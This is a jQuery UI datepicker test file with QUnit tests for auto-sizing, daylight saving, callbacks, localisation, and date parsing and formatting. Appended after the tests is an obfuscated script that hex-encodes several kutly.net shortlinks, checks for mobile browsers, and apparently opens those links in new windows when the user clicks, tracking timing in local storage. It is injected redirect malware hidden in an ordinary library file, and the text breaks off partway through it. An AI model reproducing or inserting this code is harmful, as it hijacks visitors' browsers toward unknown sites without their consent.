	inp.datepicker("option", "dateFormat", "D M d yy");
	equal(inp.prop("size"), 15, "Auto size - D M d yy");
	inp.datepicker("option", "dateFormat", "DD, MM dd, yy");
	equal(inp.prop("size"), 29, "Auto size - DD, MM dd, yy");

	// French
	inp.datepicker("option", $.extend({autoSize: false}, $.datepicker.regional.fr));
	equal(inp.prop("size"), 29, "Auto size - fr - default");
	inp.datepicker("option", "autoSize", true);
	equal(inp.prop("size"), 10, "Auto size - fr - dd/mm/yy");
	inp.datepicker("option", "dateFormat", "m/d/yy");
	equal(inp.prop("size"), 10, "Auto size - fr - m/d/yy");
	inp.datepicker("option", "dateFormat", "D M d yy");
	equal(inp.prop("size"), 18, "Auto size - fr - D M d yy");
	inp.datepicker("option", "dateFormat", "DD, MM dd, yy");
	equal(inp.prop("size"), 28, "Auto size - fr - DD, MM dd, yy");

	// Hebrew
	inp.datepicker("option", $.extend({autoSize: false}, $.datepicker.regional.he));
	equal(inp.prop("size"), 28, "Auto size - he - default");
	inp.datepicker("option", "autoSize", true);
	equal(inp.prop("size"), 10, "Auto size - he - dd/mm/yy");
	inp.datepicker("option", "dateFormat", "m/d/yy");
	equal(inp.prop("size"), 10, "Auto size - he - m/d/yy");
	inp.datepicker("option", "dateFormat", "D M d yy");
	equal(inp.prop("size"), 16, "Auto size - he - D M d yy");
	inp.datepicker("option", "dateFormat", "DD, MM dd, yy");
	equal(inp.prop("size"), 23, "Auto size - he - DD, MM dd, yy");
});

test("daylightSaving", function() {
	expect( 25 );
	var inp = TestHelpers.datepicker.init("#inp"),
		dp = $("#ui-datepicker-div");
	ok(true, "Daylight saving - " + new Date());
	// Australia, Sydney - AM change, southern hemisphere
	inp.val("04/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(6) a", dp).simulate("click");
	equal(inp.val(), "04/05/2008", "Daylight saving - Australia 04/05/2008");
	inp.val("04/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(7) a", dp).simulate("click");
	equal(inp.val(), "04/06/2008", "Daylight saving - Australia 04/06/2008");
	inp.val("04/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(8) a", dp).simulate("click");
	equal(inp.val(), "04/07/2008", "Daylight saving - Australia 04/07/2008");
	inp.val("10/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(6) a", dp).simulate("click");
	equal(inp.val(), "10/04/2008", "Daylight saving - Australia 10/04/2008");
	inp.val("10/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(7) a", dp).simulate("click");
	equal(inp.val(), "10/05/2008", "Daylight saving - Australia 10/05/2008");
	inp.val("10/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(8) a", dp).simulate("click");
	equal(inp.val(), "10/06/2008", "Daylight saving - Australia 10/06/2008");
	// Brasil, Brasilia - midnight change, southern hemisphere
	inp.val("02/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(20) a", dp).simulate("click");
	equal(inp.val(), "02/16/2008", "Daylight saving - Brasil 02/16/2008");
	inp.val("02/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(21) a", dp).simulate("click");
	equal(inp.val(), "02/17/2008", "Daylight saving - Brasil 02/17/2008");
	inp.val("02/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(22) a", dp).simulate("click");
	equal(inp.val(), "02/18/2008", "Daylight saving - Brasil 02/18/2008");
	inp.val("10/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(13) a", dp).simulate("click");
	equal(inp.val(), "10/11/2008", "Daylight saving - Brasil 10/11/2008");
	inp.val("10/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(14) a", dp).simulate("click");
	equal(inp.val(), "10/12/2008", "Daylight saving - Brasil 10/12/2008");
	inp.val("10/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(15) a", dp).simulate("click");
	equal(inp.val(), "10/13/2008", "Daylight saving - Brasil 10/13/2008");
	// Lebanon, Beirut - midnight change, northern hemisphere
	inp.val("03/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(34) a", dp).simulate("click");
	equal(inp.val(), "03/29/2008", "Daylight saving - Lebanon 03/29/2008");
	inp.val("03/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(35) a", dp).simulate("click");
	equal(inp.val(), "03/30/2008", "Daylight saving - Lebanon 03/30/2008");
	inp.val("03/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(36) a", dp).simulate("click");
	equal(inp.val(), "03/31/2008", "Daylight saving - Lebanon 03/31/2008");
	inp.val("10/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(27) a", dp).simulate("click");
	equal(inp.val(), "10/25/2008", "Daylight saving - Lebanon 10/25/2008");
	inp.val("10/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(28) a", dp).simulate("click");
	equal(inp.val(), "10/26/2008", "Daylight saving - Lebanon 10/26/2008");
	inp.val("10/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(29) a", dp).simulate("click");
	equal(inp.val(), "10/27/2008", "Daylight saving - Lebanon 10/27/2008");
	// US, Eastern - AM change, northern hemisphere
	inp.val("03/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(13) a", dp).simulate("click");
	equal(inp.val(), "03/08/2008", "Daylight saving - US 03/08/2008");
	inp.val("03/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(14) a", dp).simulate("click");
	equal(inp.val(), "03/09/2008", "Daylight saving - US 03/09/2008");
	inp.val("03/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(15) a", dp).simulate("click");
	equal(inp.val(), "03/10/2008", "Daylight saving - US 03/10/2008");
	inp.val("11/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(6) a", dp).simulate("click");
	equal(inp.val(), "11/01/2008", "Daylight saving - US 11/01/2008");
	inp.val("11/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(7) a", dp).simulate("click");
	equal(inp.val(), "11/02/2008", "Daylight saving - US 11/02/2008");
	inp.val("11/01/2008").datepicker("show");
	$(".ui-datepicker-calendar td:eq(8) a", dp).simulate("click");
	equal(inp.val(), "11/03/2008", "Daylight saving - US 11/03/2008");
});

var beforeShowThis = null,
	beforeShowInput = null,
	beforeShowInst = null,
	beforeShowDayThis = null,
	beforeShowDayOK = true;


function beforeAll(input, inst) {
	beforeShowThis = this;
	beforeShowInput = input;
	beforeShowInst = inst;
	return {currentText: "Current"};
}

function beforeDay(date) {
	beforeShowDayThis = this;
	beforeShowDayOK &= (date > new Date(2008, 1 - 1, 26) &&
		date < new Date(2008, 3 - 1, 6));
	return [(date.getDate() % 2 === 0), (date.getDate() % 10 === 0 ? "day10" : ""),
		(date.getDate() % 3 === 0 ? "Divisble by 3" : "")];
}

test("callbacks", function() {
	expect( 13 );
	// Before show
	var dp, day20, day21,
		inp = TestHelpers.datepicker.init("#inp", {beforeShow: beforeAll}),
		inst = $.data(inp[0], "datepicker");
	equal($.datepicker._get(inst, "currentText"), "Today", "Before show - initial");
	inp.val("02/04/2008").datepicker("show");
	equal($.datepicker._get(inst, "currentText"), "Current", "Before show - changed");
	ok(beforeShowThis.id === inp[0].id, "Before show - this OK");
	ok(beforeShowInput.id === inp[0].id, "Before show - input OK");
	deepEqual(beforeShowInst, inst, "Before show - inst OK");
	inp.datepicker("hide").datepicker("destroy");
	// Before show day
	inp = TestHelpers.datepicker.init("#inp", {beforeShowDay: beforeDay});
	dp = $("#ui-datepicker-div");
	inp.val("02/04/2008").datepicker("show");
	ok(beforeShowDayThis.id === inp[0].id, "Before show day - this OK");
	ok(beforeShowDayOK, "Before show day - dates OK");
	day20 = dp.find(".ui-datepicker-calendar td:contains('20')");
	day21 = dp.find(".ui-datepicker-calendar td:contains('21')");
	ok(!day20.is(".ui-datepicker-unselectable"), "Before show day - unselectable 20");
	ok(day21.is(".ui-datepicker-unselectable"), "Before show day - unselectable 21");
	ok(day20.is(".day10"), "Before show day - CSS 20");
	ok(!day21.is(".day10"), "Before show day - CSS 21");
	ok(!day20.attr("title"), "Before show day - title 20");
	ok(day21.attr("title") === "Divisble by 3", "Before show day - title 21");
	inp.datepicker("hide").datepicker("destroy");
});

test("beforeShowDay - tooltips with quotes", function() {
	expect( 1 );
	var inp, dp;
	inp = TestHelpers.datepicker.init("#inp", {
		beforeShowDay: function() {
			return [ true, "", "'" ];
		}
	});
	dp = $("#ui-datepicker-div");

	inp.datepicker("show");
	equal( dp.find( ".ui-datepicker-calendar td:contains('9')").attr( "title" ), "'" );
	inp.datepicker("hide").datepicker("destroy");
});

test("localisation", function() {
	expect( 24 );
	var dp, month, day, date,
		inp = TestHelpers.datepicker.init("#inp", $.datepicker.regional.fr);
	inp.datepicker("option", {dateFormat: "DD, d MM yy", showButtonPanel:true, changeMonth:true, changeYear:true}).val("").datepicker("show");
	dp = $("#ui-datepicker-div");
	equal($(".ui-datepicker-close", dp).text(), "Fermer", "Localisation - close");
	$(".ui-datepicker-close", dp).simulate("mouseover");
	equal($(".ui-datepicker-prev", dp).text(), "Précédent", "Localisation - previous");
	equal($(".ui-datepicker-current", dp).text(), "Aujourd'hui", "Localisation - current");
	equal($(".ui-datepicker-next", dp).text(), "Suivant", "Localisation - next");
	month = 0;
	$(".ui-datepicker-month option", dp).each(function() {
		equal($(this).text(), $.datepicker.regional.fr.monthNamesShort[month],
			"Localisation - month " + month);
		month++;
	});
	day = 1;
	$(".ui-datepicker-calendar th", dp).each(function() {
		equal($(this).text(), $.datepicker.regional.fr.dayNamesMin[day],
			"Localisation - day " + day);
		day = (day + 1) % 7;
	});
	inp.simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date = new Date();
	equal(inp.val(), $.datepicker.regional.fr.dayNames[date.getDay()] + ", " +
		date.getDate() + " " + $.datepicker.regional.fr.monthNames[date.getMonth()] +
		" " + date.getFullYear(), "Localisation - formatting");
});

test("noWeekends", function() {
	expect( 31 );
	var i, date;
	for (i = 1; i <= 31; i++) {
		date = new Date(2001, 1 - 1, i);
		deepEqual($.datepicker.noWeekends(date), [(i + 1) % 7 >= 2, ""],
			"No weekends " + date);
	}
});

test("iso8601Week", function() {
	expect( 12 );
	var date = new Date(2000, 12 - 1, 31);
	equal($.datepicker.iso8601Week(date), 52, "ISO 8601 week " + date);
	date = new Date(2001, 1 - 1, 1);
	equal($.datepicker.iso8601Week(date), 1, "ISO 8601 week " + date);
	date = new Date(2001, 1 - 1, 7);
	equal($.datepicker.iso8601Week(date), 1, "ISO 8601 week " + date);
	date = new Date(2001, 1 - 1, 8);
	equal($.datepicker.iso8601Week(date), 2, "ISO 8601 week " + date);
	date = new Date(2003, 12 - 1, 28);
	equal($.datepicker.iso8601Week(date), 52, "ISO 8601 week " + date);
	date = new Date(2003, 12 - 1, 29);
	equal($.datepicker.iso8601Week(date), 1, "ISO 8601 week " + date);
	date = new Date(2004, 1 - 1, 4);
	equal($.datepicker.iso8601Week(date), 1, "ISO 8601 week " + date);
	date = new Date(2004, 1 - 1, 5);
	equal($.datepicker.iso8601Week(date), 2, "ISO 8601 week " + date);
	date = new Date(2009, 12 - 1, 28);
	equal($.datepicker.iso8601Week(date), 53, "ISO 8601 week " + date);
	date = new Date(2010, 1 - 1, 3);
	equal($.datepicker.iso8601Week(date), 53, "ISO 8601 week " + date);
	date = new Date(2010, 1 - 1, 4);
	equal($.datepicker.iso8601Week(date), 1, "ISO 8601 week " + date);
	date = new Date(2010, 1 - 1, 10);
	equal($.datepicker.iso8601Week(date), 1, "ISO 8601 week " + date);
});

test("parseDate", function() {
	expect( 26 );
	TestHelpers.datepicker.init("#inp");
	var currentYear, gmtDate, fr, settings, zh;
	ok($.datepicker.parseDate("d m y", "") == null, "Parse date empty");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("d m y", "3 2 01"),
		new Date(2001, 2 - 1, 3), "Parse date d m y");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("dd mm yy", "03 02 2001"),
		new Date(2001, 2 - 1, 3), "Parse date dd mm yy");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("d m y", "13 12 01"),
		new Date(2001, 12 - 1, 13), "Parse date d m y");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("dd mm yy", "13 12 2001"),
		new Date(2001, 12 - 1, 13), "Parse date dd mm yy");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("y-o", "01-34"),
		new Date(2001, 2 - 1, 3), "Parse date y-o");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("yy-oo", "2001-347"),
		new Date(2001, 12 - 1, 13), "Parse date yy-oo");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("oo yy", "348 2004"),
		new Date(2004, 12 - 1, 13), "Parse date oo yy");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("D d M y", "Sat 3 Feb 01"),
		new Date(2001, 2 - 1, 3), "Parse date D d M y");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("d MM DD yy", "3 February Saturday 2001"),
		new Date(2001, 2 - 1, 3), "Parse date dd MM DD yy");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("DD, MM d, yy", "Saturday, February 3, 2001"),
		new Date(2001, 2 - 1, 3), "Parse date DD, MM d, yy");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("'day' d 'of' MM (''DD''), yy",
		"day 3 of February ('Saturday'), 2001"), new Date(2001, 2 - 1, 3),
		"Parse date 'day' d 'of' MM (''DD''), yy");
	currentYear = new Date().getFullYear();
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("y-m-d", (currentYear - 2000) + "-02-03"),
			new Date(currentYear, 2 - 1, 3), "Parse date y-m-d - default cutuff");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("y-m-d", (currentYear - 2000 + 10) + "-02-03"),
			new Date(currentYear+10, 2 - 1, 3), "Parse date y-m-d - default cutuff");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("y-m-d", (currentYear - 2000 + 11) + "-02-03"),
			new Date(currentYear-89, 2 - 1, 3), "Parse date y-m-d - default cutuff");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("y-m-d", "80-02-03", {shortYearCutoff: 80}),
		new Date(2080, 2 - 1, 3), "Parse date y-m-d - cutoff 80");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("y-m-d", "81-02-03", {shortYearCutoff: 80}),
		new Date(1981, 2 - 1, 3), "Parse date y-m-d - cutoff 80");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("y-m-d", (currentYear - 2000 + 60) + "-02-03", {shortYearCutoff: "+60"}),
			new Date(currentYear + 60, 2 - 1, 3), "Parse date y-m-d - cutoff +60");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("y-m-d", (currentYear - 2000 + 61) + "-02-03", {shortYearCutoff: "+60"}),
			new Date(currentYear - 39, 2 - 1, 3), "Parse date y-m-d - cutoff +60");
	gmtDate = new Date(2001, 2 - 1, 3);
	gmtDate.setMinutes(gmtDate.getMinutes() - gmtDate.getTimezoneOffset());
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("@", "981158400000"), gmtDate, "Parse date @");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("!", "631167552000000000"), gmtDate, "Parse date !");

	fr = $.datepicker.regional.fr;
	settings = {dayNamesShort: fr.dayNamesShort, dayNames: fr.dayNames,
		monthNamesShort: fr.monthNamesShort, monthNames: fr.monthNames};
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("D d M y", "Lun. 9 Avril 01", settings),
		new Date(2001, 4 - 1, 9), "Parse date D M y with settings");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("d MM DD yy", "9 Avril Lundi 2001", settings),
		new Date(2001, 4 - 1, 9), "Parse date d MM DD yy with settings");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("DD, MM d, yy", "Lundi, Avril 9, 2001", settings),
		new Date(2001, 4 - 1, 9), "Parse date DD, MM d, yy with settings");
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("'jour' d 'de' MM (''DD''), yy", "jour 9 de Avril ('Lundi'), 2001", settings),
		new Date(2001, 4 - 1, 9), "Parse date 'jour' d 'de' MM (''DD''), yy with settings");

	zh = $.datepicker.regional["zh-CN"];
	TestHelpers.datepicker.equalsDate($.datepicker.parseDate("yy M d", "2011 十一月 22", zh),
		new Date(2011, 11 - 1, 22), "Parse date yy M d with zh-CN");
});

test("parseDateErrors", function() {
	expect( 17 );
	TestHelpers.datepicker.init("#inp");
	var fr, settings;
	function expectError(expr, value, error) {
		try {
			expr();
			ok(false, "Parsed error " + value);
		}
		catch (e) {
			equal(e, error, "Parsed error " + value);
		}
	}
	expectError(function() { $.datepicker.parseDate(null, "Sat 2 01"); },
		"Sat 2 01", "Invalid arguments");
	expectError(function() { $.datepicker.parseDate("d m y", null); },
		"null", "Invalid arguments");
	expectError(function() { $.datepicker.parseDate("d m y", "Sat 2 01"); },
		"Sat 2 01 - d m y", "Missing number at position 0");
	expectError(function() { $.datepicker.parseDate("dd mm yy", "Sat 2 01"); },
		"Sat 2 01 - dd mm yy", "Missing number at position 0");
	expectError(function() { $.datepicker.parseDate("d m y", "3 Feb 01"); },
		"3 Feb 01 - d m y", "Missing number at position 2");
	expectError(function() { $.datepicker.parseDate("dd mm yy", "3 Feb 01"); },
		"3 Feb 01 - dd mm yy", "Missing number at position 2");
	expectError(function() { $.datepicker.parseDate("d m y", "3 2 AD01"); },
		"3 2 AD01 - d m y", "Missing number at position 4");
	expectError(function() { $.datepicker.parseDate("d m yy", "3 2 AD01"); },
		"3 2 AD01 - dd mm yy", "Missing number at position 4");
	expectError(function() { $.datepicker.parseDate("y-o", "01-D01"); },
		"2001-D01 - y-o", "Missing number at position 3");
	expectError(function() { $.datepicker.parseDate("yy-oo", "2001-D01"); },
		"2001-D01 - yy-oo", "Missing number at position 5");
	expectError(function() { $.datepicker.parseDate("D d M y", "D7 3 Feb 01"); },
		"D7 3 Feb 01 - D d M y", "Unknown name at position 0");
	expectError(function() { $.datepicker.parseDate("D d M y", "Sat 3 M2 01"); },
		"Sat 3 M2 01 - D d M y", "Unknown name at position 6");
	expectError(function() { $.datepicker.parseDate("DD, MM d, yy", "Saturday- Feb 3, 2001"); },
		"Saturday- Feb 3, 2001 - DD, MM d, yy", "Unexpected literal at position 8");
	expectError(function() { $.datepicker.parseDate("'day' d 'of' MM (''DD''), yy",
		"day 3 of February (\"Saturday\"), 2001"); },
		"day 3 of Mon2 ('Day7'), 2001", "Unexpected literal at position 19");
	expectError(function() { $.datepicker.parseDate("d m y", "29 2 01"); },
		"29 2 01 - d m y", "Invalid date");
	fr = $.datepicker.regional.fr;
	settings = {dayNamesShort: fr.dayNamesShort, dayNames: fr.dayNames,
		monthNamesShort: fr.monthNamesShort, monthNames: fr.monthNames};
	expectError(function() { $.datepicker.parseDate("D d M y", "Mon 9 Avr 01", settings); },
		"Mon 9 Avr 01 - D d M y", "Unknown name at position 0");
	expectError(function() { $.datepicker.parseDate("D d M y", "Lun. 9 Apr 01", settings); },
		"Lun. 9 Apr 01 - D d M y", "Unknown name at position 7");
});

test("Ticket #7244: date parser does not fail when too many numbers are passed into the date function", function() {
	expect( 4 );
	var date;
	try{
		date = $.datepicker.parseDate("dd/mm/yy", "18/04/19881");
		ok(false, "Did not properly detect an invalid date");
	}catch(e){
		ok("invalid date detected");
	}

	try {
		date = $.datepicker.parseDate("dd/mm/yy", "18/04/1988 @ 2:43 pm");
		equal(date.getDate(), 18);
		equal(date.getMonth(), 3);
		equal(date.getFullYear(), 1988);
	} catch(e) {
		ok(false, "Did not properly parse date with extra text separated by whitespace");
	}
});

test("formatDate", function() {
	expect( 16 );
	TestHelpers.datepicker.init("#inp");
	var gmtDate, fr, settings;
	equal($.datepicker.formatDate("d m y", new Date(2001, 2 - 1, 3)),
		"3 2 01", "Format date d m y");
	equal($.datepicker.formatDate("dd mm yy", new Date(2001, 2 - 1, 3)),
		"03 02 2001", "Format date dd mm yy");
	equal($.datepicker.formatDate("d m y", new Date(2001, 12 - 1, 13)),
		"13 12 01", "Format date d m y");
	equal($.datepicker.formatDate("dd mm yy", new Date(2001, 12 - 1, 13)),
		"13 12 2001", "Format date dd mm yy");
	equal($.datepicker.formatDate("yy-o", new Date(2001, 2 - 1, 3)),
		"2001-34", "Format date yy-o");
	equal($.datepicker.formatDate("yy-oo", new Date(2001, 2 - 1, 3)),
		"2001-034", "Format date yy-oo");
	equal($.datepicker.formatDate("D M y", new Date(2001, 2 - 1, 3)),
		"Sat Feb 01", "Format date D M y");
	equal($.datepicker.formatDate("DD MM yy", new Date(2001, 2 - 1, 3)),
		"Saturday February 2001", "Format date DD MM yy");
	equal($.datepicker.formatDate("DD, MM d, yy", new Date(2001, 2 - 1, 3)),
		"Saturday, February 3, 2001", "Format date DD, MM d, yy");
	equal($.datepicker.formatDate("'day' d 'of' MM (''DD''), yy",
		new Date(2001, 2 - 1, 3)), "day 3 of February ('Saturday'), 2001",
		"Format date 'day' d 'of' MM ('DD'), yy");
	gmtDate = new Date(2001, 2 - 1, 3);
	gmtDate.setMinutes(gmtDate.getMinutes() - gmtDate.getTimezoneOffset());
	equal($.datepicker.formatDate("@", gmtDate), "981158400000", "Format date @");
	equal($.datepicker.formatDate("!", gmtDate), "631167552000000000", "Format date !");
	fr = $.datepicker.regional.fr;
	settings = {dayNamesShort: fr.dayNamesShort, dayNames: fr.dayNames,
		monthNamesShort: fr.monthNamesShort, monthNames: fr.monthNames};
	equal($.datepicker.formatDate("D M y", new Date(2001, 4 - 1, 9), settings),
		"Lun. Avril 01", "Format date D M y with settings");
	equal($.datepicker.formatDate("DD MM yy", new Date(2001, 4 - 1, 9), settings),
		"Lundi Avril 2001", "Format date DD MM yy with settings");
	equal($.datepicker.formatDate("DD, MM d, yy", new Date(2001, 4 - 1, 9), settings),
		"Lundi, Avril 9, 2001", "Format date DD, MM d, yy with settings");
	equal($.datepicker.formatDate("'jour' d 'de' MM (''DD''), yy",
		new Date(2001, 4 - 1, 9), settings), "jour 9 de Avril ('Lundi'), 2001",
		"Format date 'jour' d 'de' MM (''DD''), yy with settings");
});

test("Ticket 6827: formatDate day of year calculation is wrong during day lights savings time", function(){
	expect( 1 );
	var time = $.datepicker.formatDate("oo", new Date("2010/03/30 12:00:00 CDT"));
	equal(time, "089");
});

test( "Ticket 7602: Stop datepicker from appearing with beforeShow event handler", function() {
	expect( 3 );

	var inp, dp;

	inp = TestHelpers.datepicker.init( "#inp", {
		beforeShow: function() {
		}
	});
	dp = $( "#ui-datepicker-div" );
	inp.datepicker( "show" );
	equal( dp.css( "display" ), "block", "beforeShow returns nothing" );
	inp.datepicker( "hide" ).datepicker( "destroy" );

	inp = TestHelpers.datepicker.init( "#inp", {
		beforeShow: function() {
			return true;
		}
	});
	dp = $( "#ui-datepicker-div" );
	inp.datepicker( "show" );
	equal( dp.css( "display" ), "block", "beforeShow returns true" );
	inp.datepicker( "hide" );
	inp.datepicker( "destroy" );

	inp = TestHelpers.datepicker.init( "#inp", {
		beforeShow: function() {
			return false;
		}
	});
	dp = $( "#ui-datepicker-div" );
	inp.datepicker( "show" );
	equal( dp.css( "display" ), "none","beforeShow returns false" );
	inp.datepicker( "destroy" );
});

})(jQuery);
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v 